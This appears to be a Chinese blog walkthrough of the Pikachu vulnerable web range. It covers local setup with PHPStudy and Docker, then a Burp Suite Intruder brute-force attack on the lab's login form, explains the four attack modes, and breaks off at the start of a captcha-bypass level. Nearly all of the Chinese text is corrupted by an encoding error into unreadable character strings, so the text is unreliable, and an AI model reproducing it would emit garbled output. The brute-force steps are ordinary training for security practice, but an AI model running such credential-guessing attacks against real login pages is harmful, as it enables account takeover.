---
title: "pikachu é¶åœºé€šå…³"
date: 2026-02-05T15:00:00+08:00
tags:
  - "é¶åœº"
categories:
  - "æ¼æ´é¶åœº"
description: "pikachu é¶åœºé€šå…³"
draft: false
showToc: true
tocOpen: true
---


# ä¸€ã€ pikachu é¶åœºæ­å»º

## 1ã€å‡†å¤‡å·¥ä½œ
### 1.1  æ­å»ºç¯å¢ƒ
+ Windows
+ PHPStudy
+ pikachu

### 1.2  ä¸‹è½½é“¾æ¥
Pikachu ä¸‹è½½åœ°å€ï¼š  
[https://github.com/zhuifengshaonianhanlu/pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)  
PHPStudy é›†æˆå¼€å‘ç¯å¢ƒï¼š  
[https://www.xp.cn/](https://www.xp.cn/)  
æ•°æ®åº“è¿æ¥ï¼š  
[https://www.navicat.com.cn/](https://www.navicat.com.cn/)   ï¼ˆæš‚æ—¶ä¸ä¼šç”¨åˆ°ï¼‰



## 2ã€ç¯å¢ƒå®‰è£…
### 2.1  PHPStudy
ä¸‹è½½ v8.1 ç‰ˆ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512282205101.png)



**å®‰è£…è·¯å¾„ä¸èƒ½åŒ…å«ä¸­æ–‡æˆ–ç©ºæ ¼**

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623862.png)

å®‰è£…å®Œæˆï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627591.png)



å¯åŠ¨æœåŠ¡ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621889.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630255.png)





### 2.2  pikachu
githubä¸‹è½½æºç ï¼š

Pikachu ä¸‹è½½åœ°å€ï¼š  
[https://github.com/zhuifengshaonianhanlu/pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635530.png)





ä¸‹è½½åå°†æºç æ”¾åˆ°ä»¥ä¸‹ç›®å½•ä¸­ï¼š

`phpstudyå®‰è£…ç›®å½•\WWW`



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627217.png)





ä¹‹ååœ¨å°çš®é¢æ¿ä¸­ **åˆ›å»ºç½‘ç«™**ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621726.png)



åŸºæœ¬é…ç½®ï¼š**ï¼ˆä»¥è‡ªå·±çš„å®é™…æƒ…å†µä¸ºå‡†ï¼‰**

```plain
åŸŸåï¼špikachu
ç«¯å£ï¼š8088 
æ ¹ç›®å½•ï¼šC:/phpstudy_pro/WWW/pikachu-master
PHPç‰ˆæœ¬ï¼š ï¼ˆå…³äºPHPç‰ˆæœ¬ä¼˜å…ˆé»˜è®¤ï¼Œå¦‚åç»­é‡åˆ°é—®é¢˜ï¼Œå°è¯•é™ç‰ˆæœ¬ï¼‰
åˆ°æœŸæ—¥æœŸï¼š
```

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628447.png)



**ä¿®æ”¹æ•°æ®åº“é…ç½®æ–‡ä»¶**





é¦–å…ˆæ‰¾åˆ°æ•°æ®åº“å¯†ç ï¼š`root`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512282206137.png)



æ‰“å¼€é…ç½®æ–‡ä»¶ï¼š

C:\phpstudy_pro\WWW\pikachu-master\inc\config.inc.php

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512282206089.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512282206934.png)



å°†ä»¥ä¸‹å†…å®¹æ·»åŠ å¯†ç ï¼šï¼ˆå…¶ä»–å‚æ•°ä¿æŒé»˜è®¤å³å¯ï¼Œä¸å¿…ä¿®æ”¹ï¼‰

```plain
define('DBPW', '');//å°†rootä¿®æ”¹ä¸ºè¿æ¥mysqlçš„å¯†ç ï¼Œå¦‚æœæ”¹äº†è¿˜æ˜¯è¿æ¥ä¸ä¸Šï¼Œè¯·å…ˆæ‰‹åŠ¨è¿æ¥ä¸‹ä½ çš„æ•°æ®åº“ï¼Œç¡®ä¿æ•°æ®åº“æœåŠ¡æ²¡é—®é¢˜åœ¨è¯´!
```

ä¿å­˜ï¼ï¼

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512282206675.png)



ä¹‹åé‡å¯æœåŠ¡

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627525.png)





ç¬¬ä¸€æ¬¡æ‰“å¼€ç½‘ç«™åå¯èƒ½æ˜¯ä»¥ä¸‹çš„æƒ…å†µï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620718.png)



è¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰è¿›è¡Œå®‰è£…ï¼Œ

å¯ä»¥å…ˆè®¿é—®ï¼š[http://pikachu:8088/install.php](http://pikachu:8088/install.php)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616743.png)



ç‚¹å‡»â€œå®‰è£…åˆå§‹åŒ–â€ï¼š

å‡ºç°ä»¥ä¸‹ç•Œé¢å°±å¯ä»¥äº†

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617776.png)





è¿›å…¥é¦–é¡µï¼Œå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„ç»ƒä¹ å•¦~

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636363.png)





## 3ã€docker å®¹å™¨
<font style="color:rgb(31, 35, 40);">ä½¿ç”¨å·²æœ‰æ„å»ºï¼š</font>

<font style="color:rgb(31, 35, 40);background-color:rgb(246, 248, 250);">docker run -d -p 8765:80 8023/pikachu-expect:latest</font>

<font style="color:rgb(31, 35, 40);">æœ¬åœ°æ„å»ºï¼š</font>

```plain
å¦‚æœä½ ç†Ÿæ‚‰docker,ä¹Ÿå¯ä»¥ç›´æ¥ç”¨dockeréƒ¨ç½²
docker build -t "pikachu" .
docker run -d -p 8080:80 pikachu
```





<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635383.png)



[**http://39.106.48.91:8765/index.php**](http://39.106.48.91:8765/index.php)

**å› ä¸ºæ˜¯åœ¨äº‘æœåŠ¡å™¨ä¸Šï¼Œæ‰€ä»¥æ¯”å¦‚ xss çš„ payload å°±ä¼šè¢«ç›´æ¥æ‹¦æˆªï¼Œè¿˜æ˜¯ä¸ç”¨å®ƒäº†ç½¢ã€‚**

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623182.png)







# äºŒã€é¶åœºè¯¦è§£
# 1ã€æš´åŠ›ç ´è§£
> **<font style="color:rgb(57, 57, 57);">Burte Forceï¼ˆæš´åŠ›ç ´è§£ï¼‰æ¦‚è¿°</font>**
>
> <font style="color:rgb(57, 57, 57);">â€œæš´åŠ›ç ´è§£â€æ˜¯ä¸€æ”»å‡»å…·æ‰‹æ®µï¼Œåœ¨webæ”»å‡»ä¸­ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ç§æ‰‹æ®µå¯¹åº”ç”¨ç³»ç»Ÿçš„è®¤è¯ä¿¡æ¯è¿›è¡Œè·å–ã€‚ å…¶è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨å¤§é‡çš„è®¤è¯ä¿¡æ¯åœ¨è®¤è¯æ¥å£è¿›è¡Œå°è¯•ç™»å½•ï¼Œç›´åˆ°å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæš´åŠ›ç ´è§£ä¸€èˆ¬ä¼šä½¿ç”¨å¸¦æœ‰å­—å…¸çš„å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">ç†è®ºä¸Šæ¥è¯´ï¼Œå¤§å¤šæ•°ç³»ç»Ÿéƒ½æ˜¯å¯ä»¥è¢«æš´åŠ›ç ´è§£çš„ï¼Œåªè¦æ”»å‡»è€…æœ‰è¶³å¤Ÿå¼ºå¤§çš„è®¡ç®—èƒ½åŠ›å’Œæ—¶é—´ï¼Œæ‰€ä»¥æ–­å®šä¸€ä¸ªç³»ç»Ÿæ˜¯å¦å­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œå…¶æ¡ä»¶ä¹Ÿä¸æ˜¯ç»å¯¹çš„ã€‚ æˆ‘ä»¬è¯´ä¸€ä¸ªwebåº”ç”¨ç³»ç»Ÿå­˜åœ¨æš´åŠ›ç ´è§£æ¼æ´ï¼Œä¸€èˆ¬æ˜¯æŒ‡è¯¥webåº”ç”¨ç³»ç»Ÿæ²¡æœ‰é‡‡ç”¨æˆ–è€…é‡‡ç”¨äº†æ¯”è¾ƒå¼±çš„è®¤è¯å®‰å…¨ç­–ç•¥ï¼Œå¯¼è‡´å…¶è¢«æš´åŠ›ç ´è§£çš„â€œå¯èƒ½æ€§â€å˜çš„æ¯”è¾ƒé«˜ã€‚ è¿™é‡Œçš„è®¤è¯å®‰å…¨ç­–ç•¥, åŒ…æ‹¬ï¼š</font>
>
> <font style="color:rgb(57, 57, 57);">1.æ˜¯å¦è¦æ±‚ç”¨æˆ·è®¾ç½®å¤æ‚çš„å¯†ç ï¼›  
</font><font style="color:rgb(57, 57, 57);">2.æ˜¯å¦æ¯æ¬¡è®¤è¯éƒ½ä½¿ç”¨å®‰å…¨çš„éªŒè¯ç ï¼ˆæƒ³æƒ³ä½ ä¹°ç«è½¦ç¥¨æ—¶è¾“çš„éªŒè¯ç ï½ï¼‰æˆ–è€…æ‰‹æœºotpï¼›  
</font><font style="color:rgb(57, 57, 57);">3.æ˜¯å¦å¯¹å°è¯•ç™»å½•çš„è¡Œä¸ºè¿›è¡Œåˆ¤æ–­å’Œé™åˆ¶ï¼ˆå¦‚ï¼šè¿ç»­5æ¬¡é”™è¯¯ç™»å½•ï¼Œè¿›è¡Œè´¦å·é”å®šæˆ–IPåœ°å€é”å®šç­‰ï¼‰ï¼›  
</font><font style="color:rgb(57, 57, 57);">4.æ˜¯å¦é‡‡ç”¨äº†åŒå› ç´ è®¤è¯ï¼›  
</font><font style="color:rgb(57, 57, 57);">...ç­‰ç­‰ã€‚  
</font><font style="color:rgb(57, 57, 57);">åƒä¸‡ä¸è¦å°çœ‹æš´åŠ›ç ´è§£æ¼æ´,å¾€å¾€è¿™ç§ç®€å•ç²—æš´çš„æ”»å‡»æ–¹å¼å¸¦æ¥çš„æ•ˆæœæ˜¯è¶…å‡ºé¢„æœŸçš„!  

</font><font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œBurteForceâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);"></font>
>
> ä»æ¥æ²¡æœ‰å“ªä¸ªæ—¶ä»£çš„é»‘å®¢åƒä»Šå¤©ä¸€æ ·çƒ­è¡·äºçŒœè§£å¯†ç  ---å¥¥æ–¯ç‰¹æ´›å¤«æ–¯åŸº
>



## 1.1 åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£
åŸºäºè¡¨å•å®é™…ä¸Šå°±æ˜¯æŒ‡ç”¨å­—å…¸å»ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œå…³äºå­—å…¸çš„è·å–ï¼Œå¯ä»¥åˆ©ç”¨å·²æœ‰çš„å­—å…¸ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ AI ç”Ÿæˆï¼Œå½“ç„¶ï¼Œé’ˆå¯¹ç‰¹æ®Šåœºæ™¯å¯èƒ½è¦æ ¹æ®å®é™…æƒ…å†µåˆ›å»ºå­—å…¸ï¼ˆä¾‹å¦‚å·²çŸ¥è¯¥ç½‘ç«™æŸç”¨æˆ·çš„ä¸€äº›ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ”¶é›†çš„ä¿¡æ¯å»æ„å»ºå­—å…¸ï¼Œçˆ†ç ´å¯†ç ï¼‰ã€‚  


éšä¾¿è¾“å…¥è´¦å·ã€å¯†ç ï¼ŒæŠ“åŒ…ï¼š

è¿™é‡Œçš„æ•°æ®åŒ…æ˜¯ä»¥æ˜æ–‡ä¼ è¾“çš„ `username=111&password=2222&submit=Login` ï¼Œè¿™æ ·åªéœ€è¦çˆ†ç ´ username å’Œ password å°±å¯ä»¥äº†ã€‚ä½†æ˜¯ç›®å‰æ¥è¯´ä¸ä¼šå‡ºç°å¦‚æ­¤ç®€å•çš„æ˜æ–‡å¯†ç è®©åˆ«äººæ¥çˆ†ç ´ã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636155.png)



å°†æ•°æ®åŒ…å³é”®å‘é€åˆ° `Intruder` 



### â€”â€”â€”â€”è¯´æ˜â€”â€”â€”â€”
### ã€Burp Suite ä¸­ Intruder æ¨¡å—ã€‘
Burp Suite ä¸­ **Intruder æ¨¡å— **çš„ä½œç”¨å¯ä»¥ä¸€å¥è¯æ¦‚æ‹¬ä¸ºï¼š

> ğŸ‘‰ **è‡ªåŠ¨åŒ–åœ°å‘ç›®æ ‡å‘é€å¤§é‡â€œå˜å½¢è¯·æ±‚â€ï¼Œç”¨äºæµ‹è¯•æ¼æ´å’ŒçŒœè§£æ•°æ®ã€‚**
>
> ### ç®€å•è¯´æ˜
> Intruder æ˜¯ä¸€ä¸ª **ä¸»åŠ¨æ”»å‡» / æµ‹è¯•å·¥å…·**ï¼Œä¸»è¦ç”¨äº**é‡å¤å‘é€è¯·æ±‚å¹¶æ‰¹é‡æ›¿æ¢å‚æ•°**ï¼Œå¸¸è§ç”¨é€”åŒ…æ‹¬ï¼š
>
> + ğŸ” **æš´åŠ›ç ´è§£**ï¼š
>     - ç”¨æˆ·å / å¯†ç 
>     - éªŒè¯ç ã€Tokenã€PIN ç­‰
> + ğŸ’‰ **æ¼æ´æ¢æµ‹**ï¼š
>     - SQL æ³¨å…¥
>     - XSS
>     - å‘½ä»¤æ³¨å…¥
>     - è·¯å¾„éå†
> + ğŸ” **å‚æ•°æšä¸¾ / æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰**ï¼š
>     - æšä¸¾ IDã€æ–‡ä»¶åã€æ¥å£å‚æ•°
> + ğŸ” **ä¸šåŠ¡é€»è¾‘æµ‹è¯•**ï¼š
>     - é‡æ”¾è¯·æ±‚
>     - æµ‹è¯•è¾¹ç•Œå€¼ã€å¼‚å¸¸å€¼
>



### â€”â€”â€”â€”æ­£æ–‡â€”â€”â€”â€”
<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636722.png)



æ·»åŠ æ ‡è®°ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051618543.png)



é€‰æ‹©æ”»å‡»æ¨¡å¼ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620984.png)



### â€”â€”â€”â€”è¯´æ˜â€”â€”â€”â€”
### ã€ Burp Intruder çš„ å››ç§æ”»å‡»æ¨¡å¼ã€‘
#### 1ï¸âƒ£ Sniperï¼ˆç‹™å‡»æ‰‹æ¨¡å¼ï¼‰
**ç‰¹ç‚¹**ï¼š

+ **ä¸€ä¸ª Payload é›†åˆ**
+ **ä¸€æ¬¡åªæ›¿æ¢ä¸€ä¸ªå‚æ•°**

**å·¥ä½œæ–¹å¼**ï¼š  
æœ‰å¤šä¸ªå‚æ•°æ—¶ï¼Œ**è½®æµå¯¹æ¯ä¸€ä¸ªå‚æ•°å•ç‹¬æµ‹è¯•**ï¼Œå…¶ä»–å‚æ•°ä¿æŒä¸å˜ã€‚

**ç¤ºä¾‹**ï¼š  
è¯·æ±‚ï¼š`id=Â§1Â§&type=Â§2Â§`  
Payloadï¼š`1, 2, 3`

å‘é€è¯·æ±‚é¡ºåºï¼š

```plain
id=1&type=åŸå€¼
id=2&type=åŸå€¼
id=3&type=åŸå€¼
id=åŸå€¼&type=1
id=åŸå€¼&type=2
id=åŸå€¼&type=3
```

**å¸¸ç”¨åœºæ™¯**ï¼š

+ SQL æ³¨å…¥ç‚¹æ¢æµ‹
+ å‚æ•° fuzz
+ æ¼æ´å®šä½

ğŸ‘‰ **é»˜è®¤ã€æœ€å¸¸ç”¨æ¨¡å¼**

---

#### 2ï¸âƒ£ Battering Ramï¼ˆæ”»åŸé”¤æ¨¡å¼ï¼‰
**ç‰¹ç‚¹**ï¼š

+ **ä¸€ä¸ª Payload é›†åˆ**
+ **å¤šä¸ªå‚æ•°åŒæ—¶ä½¿ç”¨åŒä¸€ä¸ª Payload**

**å·¥ä½œæ–¹å¼**ï¼š  
æ¯æ¬¡å–ä¸€ä¸ª payloadï¼Œ**æ‰€æœ‰å‚æ•°ä¸€èµ·æ›¿æ¢æˆè¿™ä¸ªå€¼**ã€‚

**ç¤ºä¾‹**ï¼š  
è¯·æ±‚ï¼š`user=Â§Â§&pass=Â§Â§`  
Payloadï¼š`admin`

å‘é€è¯·æ±‚ï¼š

```plain
user=admin&pass=admin
```

**å¸¸ç”¨åœºæ™¯**ï¼š

+ å¤šå‚æ•°éœ€è¦ä¿æŒä¸€è‡´
+ Token / ç­¾åé‡å¤
+ å‚æ•°æœ‰å…³è”çš„æ¥å£

---

#### 3ï¸âƒ£ Pitchforkï¼ˆè‰å‰æ¨¡å¼ï¼‰
**ç‰¹ç‚¹**ï¼š

+ **å¤šä¸ª Payload é›†åˆ**
+ **ä¸€ä¸€å¯¹åº”ï¼ŒåŒæ—¶æ¨è¿›**

**å·¥ä½œæ–¹å¼**ï¼š  
ç¬¬ 1 ä¸ª payload é›†åˆçš„ç¬¬ n ä¸ª  
å¯¹åº”  
ç¬¬ 2 ä¸ª payload é›†åˆçš„ç¬¬ n ä¸ª

âš ï¸ **ä¸åšç»„åˆï¼Œåªåšå¯¹åº”**

**ç¤ºä¾‹**ï¼š

```plain
user åˆ—è¡¨ï¼š admin | test | guest
pass åˆ—è¡¨ï¼š 123456 | test123 | guest123
```

å‘é€è¯·æ±‚ï¼š

```plain
admin / 123456
test  / test123
guest / guest123
```

**å¸¸ç”¨åœºæ™¯**ï¼š

+ å·²çŸ¥è´¦å·å¯†ç å¯¹
+ ç”¨æˆ·å + æ‰‹æœºå·
+ å‚æ•°æˆå¯¹å…³ç³»æ˜ç¡®

---

#### 4ï¸âƒ£ Cluster Bombï¼ˆé›†æŸç‚¸å¼¹æ¨¡å¼ï¼‰
**ç‰¹ç‚¹**ï¼š

+ **å¤šä¸ª Payload é›†åˆ**
+ **æ‰€æœ‰ç»„åˆå…¨éƒ¨æµ‹è¯•**

**å·¥ä½œæ–¹å¼**ï¼š  
å¯¹ payload åš **ç¬›å¡å°”ç§¯ï¼ˆå…¨æ’åˆ—ï¼‰**ã€‚

**ç¤ºä¾‹**ï¼š

```plain
userï¼š admin | test
passï¼š 123 | 456
```

å‘é€è¯·æ±‚ï¼š

```plain
admin / 123
admin / 456
test  / 123
test  / 456
```

**å¸¸ç”¨åœºæ™¯**ï¼š

+ æš´åŠ›ç ´è§£
+ ç™»å½•çˆ†ç ´
+ å‚æ•°ç»„åˆæµ‹è¯•

âš ï¸ **è¯·æ±‚æ•°é‡æœ€å¤šï¼Œæœ€â€œçŒ›â€**

---

#### ğŸ“Œ å››ç§æ¨¡å¼é€Ÿè®°è¡¨ï¼ˆå¼ºçƒˆå»ºè®®èƒŒï¼‰


| æ¨¡å¼ | Payload é›†åˆ | ç»„åˆæ–¹å¼ | å…¸å‹ç”¨é€” |
| --- | --- | --- | --- |
| Sniper | 1 | å•å‚æ•°è½®æµ | æ¼æ´æ¢æµ‹ |
| Battering Ram | 1 | å¤šå‚æ•°åŒå€¼ | å‚æ•°ç»‘å®š |
| Pitchfork | å¤š | ä¸€ä¸€å¯¹åº” | æˆå¯¹æ•°æ® |
| Cluster Bomb | å¤š | å…¨æ’åˆ— | çˆ†ç ´ |


---

#### æ€»ç»“
> **Sniper æ‰¾æ¼æ´ï¼ŒRam åŒæ­¥å‚æ•°ï¼ŒPitchfork é…å¯¹ï¼ŒCluster Bomb å…¨ç‚¸ã€‚**
>



### â€”â€”â€”â€”æ­£æ–‡â€”â€”â€”â€”


é€šè¿‡ä¸Šè¿°çš„è¯´æ˜ï¼Œåœ¨æœ¬å…³ä¸­ï¼Œæˆ‘ä»¬åº”è¯¥ç”¨ Cluster Bomb æ¨¡å¼ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635853.png)



è¿›å…¥ Payloads æ¿å—ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634275.png)





<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627743.png)





<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620387.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051616101.png)





åŒæ ·çš„ï¼Œå°† Payload set ä½ç½®é€‰æ‹© passwordã€‚

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630492.png)

****

**éœ€è¦è¯´æ˜çš„æ˜¯ï¼šæœ¬å…³ä¸­ç”¨æˆ·åå’Œå¯†ç éƒ½è¾ƒä¸ºç®€å•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ burp å·²æœ‰çš„å­—å…¸å°±å¯ä»¥ã€‚**



ä¹‹åé€‰æ‹© `Start attack` å¼€å§‹çˆ†ç ´ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619132.png) 

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627954.png)



ç”±äºé»˜è®¤å­—å…¸å¤ªå¤§ï¼Œå°±ä¸ç­‰ä»–è·‘å®Œäº†ï¼Œ

ç›´æ¥æ ¹æ®æç¤ºï¼Œè¾“å…¥å¯¹åº”çš„å­—å…¸

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051626929.png)





<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622587.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620983.png)



æ ¹æ®ç»“æœæ¥çœ‹ï¼Œè¾“å…¥æ­£ç¡®çš„è´¦æˆ·å’Œå¯†ç ï¼Œè¿”å›çš„æ•°æ®åŒ…çš„é•¿åº¦å’Œå…¶ä»–çš„æ˜¯ä¸ä¸€æ ·çš„ï¼Œæˆ‘ä»¬é€šè¿‡é•¿åº¦ç›´æ¥åŒºåˆ†çˆ†ç ´æˆåŠŸçš„ Payload

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625498.png)



ç™»å½•æˆåŠŸï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630293.png)<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615301.png)





## 1.2 éªŒè¯ç ç»•è¿‡(on server)
è¿™ä¸€å…³å¤šäº†ä¸€ä¸ªéªŒè¯ç ï¼Œæ ¹æ®ä¸€èˆ¬ç»éªŒæ¥è®²ï¼ŒéªŒè¯ç åº”è¯¥è¦å®šæ—¶å‘ç”Ÿæ”¹å˜æˆ–è€…å¸¦æœ‰ç‰¹å®šçš„æ—¶é—´é™åˆ¶ã€‚



å…ˆæŠ“åŒ…çœ‹çœ‹ï¼š



å¡«å†™æ­£ç¡®çš„éªŒè¯ç ä¹‹åï¼Œä»–å°±å¼€å§‹éªŒè¯ username å’Œ password

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051618800.png)





é‚£å¡«å†™é”™è¯¯çš„éªŒè¯ç å‘¢ï¼Ÿ

å…¶ä¼šè¿›è¡ŒéªŒè¯ç çš„æ ¡éªŒ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630114.png)





